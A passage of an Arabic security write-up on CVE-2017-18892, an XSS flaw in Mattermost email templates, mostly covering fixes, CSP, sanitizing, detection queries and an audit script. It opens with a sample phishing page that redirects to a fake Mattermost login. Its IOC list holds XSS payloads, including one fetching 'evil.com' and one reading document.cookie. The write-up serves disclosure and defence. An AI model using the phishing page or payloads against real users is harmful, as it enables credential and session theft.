<span>&lt;body&gt;</span> <span>&lt;div</span> <span>class=</span><span>"container"</span><span>&gt;</span> <span>&lt;h2&gt;</span> تنبيه أمني من Mattermost<span>&lt;/h2&gt;</span> <span>&lt;p&gt;</span>تم اكتشاف محاولة تسجيل دخول مشبوهة لحسابك<span>&lt;/p&gt;</span> <span>&lt;p&gt;</span>انقر أدناه للتحقق من هويتك:<span>&lt;/p&gt;</span> <span>&lt;a</span> <span>href=</span><span>"#"</span> <span>class=</span><span>"btn"</span> <span>onclick=</span><span>"stealCredentials()"</span><span>&gt;</span>التحقق الآن<span>&lt;/a&gt;</span> <span>&lt;/div&gt;</span> <span>&lt;script&gt;</span> <span>function</span> <span>stealCredentials</span><span>()</span> <span>{</span> <span>// إعادة توجيه لصفحة تصيد</span> <span>window</span><span>.</span><span>location</span> <span>=</span> <span>'</span><span>https://fake-mattermost.com/login?next=</span><span>'</span> <span>+</span> <span>encodeURIComponent</span><span>(</span><span>window</span><span>.</span><span>location</span><span>.</span><span>href</span><span>);</span> <span>}</span> <span>&lt;/script&gt;</span>
<span>&lt;/body&gt;</span>
<span>&lt;/html&gt;</span>
</code></pre>
<div>
<p> Enter fullscreen mode Exit fullscreen mode </p>
</div>
</div> <hr> <h2> <a name="%D8%A7%D9%84%D8%A5%D8%B5%D9%84%D8%A7%D8%AD-%D9%88%D8%A7%D9%84%D8%AD%D9%85%D8%A7%D9%8A%D8%A9" href="#%D8%A7%D9%84%D8%A5%D8%B5%D9%84%D8%A7%D8%AD-%D9%88%D8%A7%D9%84%D8%AD%D9%85%D8%A7%D9%8A%D8%A9"> </a> الإصلاح والحماية
</h2> <h3> <a name="%D8%A7%D9%84%D8%AD%D9%84-%D8%A7%D9%84%D8%B1%D8%B3%D9%85%D9%8A-v420" href="#%D8%A7%D9%84%D8%AD%D9%84-%D8%A7%D9%84%D8%B1%D8%B3%D9%85%D9%8A-v420"> </a> الحل الرسمي (v4.2.0+)
</h3> <div>
<pre><code><span>// mattermost-server &gt;= 4.2.0</span>
<span>// استخدام html/template بدلاً من text/template</span> <span>import</span> <span>(</span> <span>"html/template"</span> <span>// ← التعقيم التلقائي</span>
<span>)</span> <span>// القالب الآمن</span>
<span>tmpl</span> <span>:=</span> <span>template</span><span>.</span><span>Must</span><span>(</span><span>template</span><span>.</span><span>New</span><span>(</span><span>"email"</span><span>)</span><span>.</span><span>Parse</span><span>(</span><span>`
&lt;html&gt;
&lt;body&gt; &lt;h1&gt;مرحباً {{.UserName}}&lt;/h1&gt; ← يُعقم تلقائياً &lt;p&gt;من {{.SenderName}}&lt;/p&gt; &lt;div&gt;{{.MessageContent}}&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
`</span><span>))</span> <span>// التنفيذ الآمن</span>
<span>tmpl</span><span>.</span><span>Execute</span><span>(</span><span>writer</span><span>,</span> <span>data</span><span>)</span> <span>// إذا كان data.UserName = "&lt;script&gt;alert(1)&lt;/script&gt;"</span>
<span>// النتيجة: &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; ← آمن!</span>
</code></pre>
<div>
<p> Enter fullscreen mode Exit fullscreen mode </p>
</div>
</div> <hr> <h3> <a name="%D8%AE%D8%B7%D9%88%D8%A7%D8%AA-%D8%A7%D9%84%D8%AD%D9%85%D8%A7%D9%8A%D8%A9-%D8%A7%D9%84%D9%81%D9%88%D8%B1%D9%8A%D8%A9" href="#%D8%AE%D8%B7%D9%88%D8%A7%D8%AA-%D8%A7%D9%84%D8%AD%D9%85%D8%A7%D9%8A%D8%A9-%D8%A7%D9%84%D9%81%D9%88%D8%B1%D9%8A%D8%A9"> </a> خطوات الحماية الفورية
</h3> <h4> <a name="1-%D8%A7%D9%84%D8%AA%D8%AD%D8%AF%D9%8A%D8%AB-%D8%A7%D9%84%D9%81%D9%88%D8%B1%D9%8A" href="#1-%D8%A7%D9%84%D8%AA%D8%AD%D8%AF%D9%8A%D8%AB-%D8%A7%D9%84%D9%81%D9%88%D8%B1%D9%8A"> </a> <strong>1. التحديث الفوري</strong>
</h4> <div>
<pre><code><span># فحص الإصدار الحالي</span>
curl <span>-s</span> http://mattermost-server/api/v4/system/ping | jq <span># إذا كان &lt; 4.2.0، حدّث فوراً:</span>
wget https://releases.mattermost.com/4.2.0/mattermost-4.2.0-linux-amd64.tar.gz
<span>tar</span> <span>-xzf</span> mattermost-4.2.0-linux-amd64.tar.gz
systemctl stop mattermost
<span>cp</span> <span>-r</span> mattermost /opt/
systemctl start mattermost
</code></pre>
<div>
<p> Enter fullscreen mode Exit fullscreen mode </p>
</div>
</div> <h4> <a name="2-csp-headers-%D9%81%D9%8A-email" href="#2-csp-headers-%D9%81%D9%8A-email"> </a> <strong>2. CSP Headers في Email</strong>
</h4> <div>
<pre><code><span>// إضافة Content Security Policy</span>
<span>emailHeaders</span> <span>:=</span> <span>map</span><span>[</span><span>string</span><span>]</span><span>string</span><span>{</span> <span>"Content-Type"</span><span>:</span> <span>"text/html; charset=UTF-8"</span><span>,</span> <span>"Content-Security-Policy"</span><span>:</span> <span>"default-src 'none'; img-src https:; style-src 'unsafe-inline'"</span><span>,</span>
<span>}</span>
</code></pre>
<div>
<p> Enter fullscreen mode Exit fullscreen mode </p>
</div>
</div> <h4> <a name="3-%D8%AA%D8%B9%D9%82%D9%8A%D9%85-%D8%A5%D8%B6%D8%A7%D9%81%D9%8A" href="#3-%D8%AA%D8%B9%D9%82%D9%8A%D9%85-%D8%A5%D8%B6%D8%A7%D9%81%D9%8A"> </a> <strong>3. تعقيم إضافي</strong>
</h4> <div>
<pre><code><span>import</span> <span>(</span> <span>"html"</span> <span>"github.com/microcosm-cc/bluemonday"</span>
<span>)</span> <span>// استخدام bluemonday للتعقيم الشامل</span>
<span>func</span> <span>SanitizeForEmail</span><span>(</span><span>input</span> <span>string</span><span>)</span> <span>string</span> <span>{</span> <span>p</span> <span>:=</span> <span>bluemonday</span><span>.</span><span>StrictPolicy</span><span>()</span> <span>return</span> <span>p</span><span>.</span><span>Sanitize</span><span>(</span><span>input</span><span>)</span>
<span>}</span> <span>// في القالب</span>
<span>data</span> <span>:=</span> <span>EmailData</span><span>{</span> <span>UserName</span><span>:</span> <span>SanitizeForEmail</span><span>(</span><span>user</span><span>.</span><span>Username</span><span>),</span> <span>Message</span><span>:</span> <span>SanitizeForEmail</span><span>(</span><span>message</span><span>.</span><span>Content</span><span>),</span>
<span>}</span>
</code></pre>
<div>
<p> Enter fullscreen mode Exit fullscreen mode </p>
</div>
</div> <h4> <a name="4-%D9%85%D8%B1%D8%A7%D8%AC%D8%B9%D8%A9-%D8%A7%D9%84%D9%82%D9%88%D8%A7%D9%84%D8%A8-%D8%A7%D9%84%D9%85%D8%AE%D8%B5%D8%B5%D8%A9" href="#4-%D9%85%D8%B1%D8%A7%D8%AC%D8%B9%D8%A9-%D8%A7%D9%84%D9%82%D9%88%D8%A7%D9%84%D8%A8-%D8%A7%D9%84%D9%85%D8%AE%D8%B5%D8%B5%D8%A9"> </a> <strong>4. مراجعة القوالب المخصصة</strong>
</h4> <div>
<pre><code><span># ابحث عن القوالب المخصصة</span>
find /opt/mattermost <span>-name</span> <span>"*.html"</span> <span>-o</span> <span>-name</span> <span>"*.tmpl"</span> <span># راجع كل قالب للتأكد من استخدام {{.Variable}} بدون |safe</span>
<span>grep</span> <span>-r</span> <span>"{{.*}}"</span> /opt/mattermost/templates/ <span># تحذير: لا تستخدم أبداً</span>
<span>{{</span> .UserInput | safe <span>}}</span> ← خطر!
<span>{{</span> .Content | noescape <span>}}</span> ← خطر!
</code></pre>
<div>
<p> Enter fullscreen mode Exit fullscreen mode </p>
</div>
</div> <hr> <h2> <a name="%D8%A7%D9%84%D9%83%D8%B4%D9%81-%D8%B9%D9%86-%D8%A7%D9%84%D8%A7%D8%B3%D8%AA%D8%BA%D9%84%D8%A7%D9%84" href="#%D8%A7%D9%84%D9%83%D8%B4%D9%81-%D8%B9%D9%86-%D8%A7%D9%84%D8%A7%D8%B3%D8%AA%D8%BA%D9%84%D8%A7%D9%84"> </a> الكشف عن الاستغلال
</h2> <h3> <a name="%D8%B9%D9%84%D8%A7%D9%85%D8%A7%D8%AA-%D8%A7%D9%84%D8%A7%D8%AE%D8%AA%D8%B1%D8%A7%D9%82" href="#%D8%B9%D9%84%D8%A7%D9%85%D8%A7%D8%AA-%D8%A7%D9%84%D8%A7%D8%AE%D8%AA%D8%B1%D8%A7%D9%82"> </a> علامات الاختراق
</h3> <div>
<pre><code><span># 1. فحص قاعدة البيانات للأسماء المشبوهة</span>
psql <span>-U</span> mmuser <span>-d</span> mattermost <span>-c</span> <span>" SELECT username, email, create_at FROM Users WHERE username LIKE '%&lt;script%' OR username LIKE '%onerror%' OR username LIKE '%javascript:%';
"</span> <span># 2. فحص سجلات البريد</span>
<span>grep</span> <span>-E</span> <span>"(&lt;script|onerror|javascript:)"</span> /var/log/mail.log <span># 3. مراجعة الرسائل المرسلة</span>
psql <span>-U</span> mmuser <span>-d</span> mattermost <span>-c</span> <span>" SELECT message, create_at, user_id FROM Posts WHERE message LIKE '%&lt;script%' OR message LIKE '%onerror%';
"</span> <span># 4. فحص Session Tokens غير الطبيعية</span>
psql <span>-U</span> mmuser <span>-d</span> mattermost <span>-c</span> <span>" SELECT token, user_id, create_at FROM Sessions WHERE create_at &gt; NOW() - INTERVAL '24 hours' ORDER BY create_at DESC;
"</span>
</code></pre>
<div>
<p> Enter fullscreen mode Exit fullscreen mode </p>
</div>
</div> <h3> <a name="%D9%85%D8%A4%D8%B4%D8%B1%D8%A7%D8%AA-%D8%A7%D9%84%D8%A7%D8%AE%D8%AA%D8%B1%D8%A7%D9%82-iocs" href="#%D9%85%D8%A4%D8%B4%D8%B1%D8%A7%D8%AA-%D8%A7%D9%84%D8%A7%D8%AE%D8%AA%D8%B1%D8%A7%D9%82-iocs"> </a> مؤشرات الاختراق (IOCs)
</h3> <div>
<pre><code><span>أسماء المستخدمين المشبوهة</span><span>:</span> <span>-</span> <span>يحتوي على</span><span>:</span> <span>&lt;script&gt;, onerror, javascript</span><span>:</span> <span>-</span> <span>أمثلة</span><span>:</span> <span>-</span> <span>"</span><span>&lt;img</span><span> </span><span>src=x</span><span> </span><span>onerror=alert(1)&gt;"</span> <span>-</span> <span>"</span><span>&lt;script&gt;fetch('evil.com')&lt;/script&gt;"</span> <span>-</span> <span>"</span><span>javascript:alert(document.cookie)"</span> <span>الرسائل الخبيثة</span><span>:</span> <span>-</span> <span>HTML tags في محتوى الرسالة</span> <span>-</span> <span>Base64 encoded scripts</span> <span>-</span> <span>External script sources</span> <span>النشاط الشبكي</span><span>:</span> <span>-</span> <span>طلبات لـ domains غير معروفة من Email Clients</span> <span>-</span> <span>POST requests لـ /api/v4/posts بمعدل عالي</span> <span>-</span> <span>Session tokens مسروقة تُستخدم من IPs مختلفة</span> <span>سلوك المستخدم</span><span>:</span> <span>-</span> <span>إنشاء حسابات بأسماء عشوائية/طويلة</span> <span>-</span> <span>إرسال رسائل لقنوات عديدة فوراً</span> <span>-</span> <span>تغيير بيانات Profile بشكل متكرر</span>
</code></pre>
<div>
<p> Enter fullscreen mode Exit fullscreen mode </p>
</div>
</div> <hr> <h2> <a name="%D8%A7%D9%84%D9%81%D8%AD%D8%B5-%D8%A7%D9%84%D8%A3%D9%85%D9%86%D9%8A-%D8%A7%D9%84%D8%B4%D8%A7%D9%85%D9%84" href="#%D8%A7%D9%84%D9%81%D8%AD%D8%B5-%D8%A7%D9%84%D8%A3%D9%85%D9%86%D9%8A-%D8%A7%D9%84%D8%B4%D8%A7%D9%85%D9%84"> </a> الفحص الأمني الشامل
</h2> <div>
<pre><code><span>#!/bin/bash</span>
<span># مراجعة أمنية شاملة لـ Mattermost</span> <span>echo</span> <span>" فحص أمان Mattermost"</span>
<span>echo</span> <span>"========================"</span> <span># 1. فحص الإصدار</span>
<span>VERSION</span><span>=</span><span>$(</span>curl <span>-s</span> http://localhost:8065/api/v4/system/ping | jq <span>-r</span> <span>'.version'</span><span>)</span>
<span>echo</span> <span>"الإصدار: </span><span>$VERSION</span><span>"</span> <span>if</span> <span>[[</span> <span>"</span><span>$VERSION</span><span>"</span> &lt; <span>"4.2.0"</span> <span>]]</span><span>;</span> <span>then </span><span>echo</span> <span>" خطر! الإصدار ضعيف لـ CVE-2017-18892"</span>
<span>fi</span> <span># 2. فحص المستخدمين المشبوهين</span>
<span>echo</span> <span>""</span>
<span>echo</span> <span>" فحص المستخدمين:"</span>
psql <span>-U</span> mmuser <span>-d</span> mattermost <span>-t</span> <span>-c</span> <span>" SELECT COUNT(*) FROM Users WHERE username ~ '(&lt;|&gt;|script|onerror)'
"</span> | xargs <span>echo</span> <span>"مستخدمين مشبوهين:"</span> <span># 3. فحص القوالب</span>
<span>echo</span> <span>""</span>
<span>echo</span> <span>" فحص قوالب البريد:"</span>
<span>if </span><span>grep</span> <span>-r</span> <span>"text/template"</span> /opt/mattermost/<span>;</span> <span>then </span><span>echo</span> <span>" وُجدت قوالب غير آمنة!"</span>
<span>else </span><span>echo</span> <span>" القوالب آمنة"</span>
<span>fi</span> <span># 4. فحص CSP</span>
<span>echo</span> <span>""</span>
<span>echo</span> <span>" فحص Content Security Policy:"</span>
<span>if </span><span>grep</span> <span>-r</span> <span>"Content-Security-Policy"</span> /opt/mattermost/config/<span>;</span> <span>then </span><span>echo</span> <span>" CSP مفعّل"</span>
<span>else </span><span>echo</span> <span>" CSP غير مفعّل"</span>
<span>fi </span><span>echo</span> <span>""</span>
<span>echo</span> <span>"========================"</span>
<span>echo</span> <span>" انتهى الفحص"</span>
</code></pre>
<div>
<p> Enter fullscreen mode Exit fullscreen mode </p>
</div>
</div> <hr> <h2> <a name="%D8%A7%D9%84%D9%85%D8%B1%D8%A7%D8%AC%D8%B9-%D8%A7%D9%84%D8%AA%D9%82%D9%86%D9%8A%D8%A9" href="#%D8%A7%D9%84%D9%85%D8%B1%D8%A7%D8%AC%D8%B9-%D8%A7%D9%84%D8%AA%D9%82%D9%86%D9%8A%D8%A9"> </a> المراجع التقنية
</h2> <div>
<pre><code>1. CVE Entry: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-18892 2. NVD Details: https://nvd.nist.gov/vuln/detail/CVE-2017-18892 3. Mattermost Security: https://mattermost.com/security-updates/ 4. GitHub Advisory: https://github.com/advisories/GHSA-xxxx-xxxx-xxxx 5. OWASP XSS: https://owasp.org/www-community/attacks/xss/ 6. CWE-79: https://cwe.mitre.org/data/definitions/79.html
</code></pre>
<div>
<p> Enter fullscreen mode Exit fullscreen mode </p>
</div>
</div> <hr> <h2> <a name="%D8%A7%D9%84%D8%AF%D8%B1%D9%88%D8%B3-%D8%A7%D9%84%D9%85%D8%B3%D8%AA%D9%81%D8%A7%D8%AF%D8%A9" href="#%D8%A7%D9%84%D8%AF%D8%B1%D9%88%D8%B3-%D8%A7%D9%84%D9%85%D8%B3%D8%AA%D9%81%D8%A7%D8%AF%D8%A9"> </a> الدروس المستفادة
</h2> <h3> <a name="%D8%A7%D9%84%D9%82%D9%88%D8%A7%D8%B9%D8%AF-%D8%A7%D9%84%D8%B0%D9%87%D8%A8%D9%8A%D8%A9" href="#%D8%A7%D9%84%D9%82%D9%88%D8%A7%D8%B9%D8%AF-%D8%A7%D9%84%D8%B0%D9%87%D8%A8%D9%8A%D8%A9"> </a> القواعد الذهبية:
</h3> <blockquote>
<p><strong>"لا تثق بأي مُدخَل - حتى لو كان اسم مستخدم"</strong></p>
</blockquote> <h3> <a name="best-practices" href="#best-practices"> </a> Best Practices
</h3> <h4> <a name="1-%D8%A7%D8%B3%D8%AA%D8%AE%D8%AF%D9%85-htmltemplate-%D8%AF%D8%A7%D8%A6%D9%85%D8%A7%D9%8B" href="#1-%D8%A7%D8%B3%D8%AA%D8%AE%D8%AF%D9%85-htmltemplate-%D8%AF%D8%A7%D8%A6%D9%85%D8%A7%D9%8B"> </a> 1. <strong>استخدم html/template دائماً</strong>
</h4> <div>
<pre><code><span>// آمن - تعقيم تلقائي</span>
<span>import</span> <span>"html/template"</span> <span>// خطر - بدون تعقيم</span>
<span>import</span> <span>"text/template"</span>
</code></pre>
<div>
<p> Enter fullscreen mode Exit fullscreen mode </p>
</div>
</div> <h4> <a name="2-%D8%B7%D8%A8%D9%82%D8%A7%D8%AA-%D8%A7%D9%84%D8%AD%D9%85%D8%A7%D9%8A%D8%A9" href="#2-%D8%B7%D8%A8%D9%82%D8%A7%D8%AA-%D8%A7%D9%84%D8%AD%D9%85%D8%A7%D9%8A%D8%A9"> </a> 2. <strong>طبقات الحماية</strong>
</h4> <div>
<pre><code>Input → Validation → Sanitization → Escaping → Output
</code></pre>
<div>
<p> Enter fullscreen mode Exit fullscreen mode </p>
</div>
</div> <h4> <a name="3-csp-%D9%81%D9%8A-%D9%83%D9%84-%D9%85%D9%83%D8%A7%D9%86" href="#3-csp-%D9%81%D9%8A-%D9%83%D9%84-%D9%85%D9%83%D8%A7%D9%86"> </a> 3. <strong>CSP في كل مكان</strong>
</h4> <div>
<pre><code><span>&lt;meta</span> <span>http-equiv=</span><span>"Content-Security-Policy"</span> <span>content=</span><span>"default-src 'none'; script-src 'self'"</span><span>&gt;</span>
</code></pre>
<div>
<p> Enter fullscreen mode Exit fullscreen mode </p>
</div>
</div> <h4> <a name="4-%D9%84%D8%A7-%D8%AA%D8%AB%D9%82-%D8%A8%D9%80-safe-flags" href="#4-%D9%84%D8%A7-%D8%AA%D8%AB%D9%82-%D8%A8%D9%80-safe-flags"> </a> 4. <strong>لا تثق بـ "Safe" Flags</strong>
</h4> <div>
<pre><code><span>// خطير جداً</span>
<span>{{</span> <span>.</span><span>UserInput</span> <span>|</span> <span>safe</span> <span>}}</span> <span>// آمن</span>
<span>{{</span> <span>.</span><span>UserInput</span> <span>}}</span> <span>// auto-escaped</span>
</code></pre>
<div>
<p> Enter fullscreen mode Exit fullscreen mode </p>
</div>
</div> <hr> <h2> <a name="%D8%AE%D8%AA%D8%A7%D9%85-%D8%A7%D9%84%D9%85%D8%AD%D8%A7%D8%B1%D8%A8" href="#%D8%AE%D8%AA%D8%A7%D9%85-%D8%A7%D9%84%D9%85%D8%AD%D8%A7%D8%B1%D8%A8"> </a> ختام المحارب
</h2> <blockquote>
<p><strong>"القالب ليس مجرد تصميم - إنه خط الدفاع الأول"</strong></p> <p>CVE-2017-18892 يُذكرنا أن <strong>الأمان يبدأ من أصغر التفاصيل</strong>.</p> <p>حتى اسم المستخدم يمكن أن يكون <strong>سلاحاً فتاكاً</strong> إذا لم نُحصّنه.</p>
</blockquote> <hr> <h2> <a name="%D8%AA%D9%88%D9%82%D9%8A%D8%B9-%D8%A7%D9%84%D8%B3%D9%8A%D8%A7%D8%AF%D8%A9" href="#%D8%AA%D9%88%D9%82%D9%8A%D8%B9-%D8%A7%D9%84%D8%B3%D9%8A%D8%A7%D8%AF%D8%A9"> </a> توقيع السيادة
</h2> <div>
<pre><code>╔═══════════════════════════════════════╗
║ ZAYED SECURITY RESEARCH TEAM ║
║ "Trust No Input, Sanitize All" ║
║ ║
║ CVE-2017-18892 ║
║ Severity: MEDIUM (6.1) ║
║ Status: PATCHED ✓ ║
╚═══════════════════════════════════════╝
</code></pre>
<div>
<p> Enter fullscreen mode Exit fullscreen mode </p>
</div>
</div> <hr> <p><strong>#XSS</strong> | <strong>#EmailSecurity</strong> | <strong>#Mattermost</strong> | <strong>#TemplateInjection</strong></p> </div></div>
  </div>
  <div class="article-elevator" aria-label="Navigation article">
    <button class="article-elevator-btn" type="button" onclick="scrollToTop()">▲</button>
    <button class="article-elevator-btn" type="button" onclick="scrollToBottom()">▼</button>
  </div>
  <script>
    function stripBlockingPanels() {
      const selector = '[id*="overlay"], [class*="overlay"], [id*="modal"], [class*="modal"], [id*="popup"], [class*="popup"], [id*="paywall"], [class*="paywall"], [id*="subscribe"], [class*="subscribe"], [id*="cookie"], [class*="cookie"], [id*="consent"], [class*="consent"], [id*="gdpr"], [class*="gdpr"], [role="dialog"], [aria-modal="true"]';
      const textPattern = /\b(cookie|consent|gdpr|subscribe|subscription|paywall|abonnez[-\s]?vous|inscrivez[-\s]?vous|continue reading|continuez la lecture)\b/i;
      document.querySelectorAll(selector).forEach((node) => node.remove());
      document.querySelectorAll('div, section, aside').forEach((node) => {
        const styleAttr = String(node.getAttribute('style') || '').toLowerCase();
        const classAndId = String(node.className || '').toLowerCase() + ' ' + String(node.id || '').toLowerCase();
        const text = String(node.textContent || '').slice(0, 800);
        const hasKeyword = textPattern.test(classAndId) || textPattern.test(text);
        const looksFixed = /(position\s*:\s*(fixed|sticky)|inset\s*:|top\s*:|left\s*:|right\s*:|bottom\s*:)/.test(styleAttr);
        const hasPriority = /(z-index\s*:\s*[1-9]\d{1,}|backdrop-filter|overflow\s*:\s*hidden)/.test(styleAttr);
        if (hasKeyword && (looksFixed || hasPriority)) node.remove();
      });
    }
    function scrollToTop() {
      window.scrollTo({ top: 0, behavior: 'auto' });
    }
    function scrollToBottom() {
      window.scrollTo({ top: document.documentElement.scrollHeight, behavior: 'auto' });
    }
    window.addEventListener('message', (event) => {
      const data = event && event.data;
      if (!data || data.type !== 'AI_PULSE_SCROLL') return;
      if (data.direction === 'up' || data.direction === 'top') scrollToTop();
      if (data.direction === 'down' || data.direction === 'bottom') scrollToBottom();
    });
    stripBlockingPanels();
    setTimeout(stripBlockingPanels, 60);
    setTimeout(stripBlockingPanels, 220);
    setTimeout(stripBlockingPanels, 650);
  </script>
</body>
</html>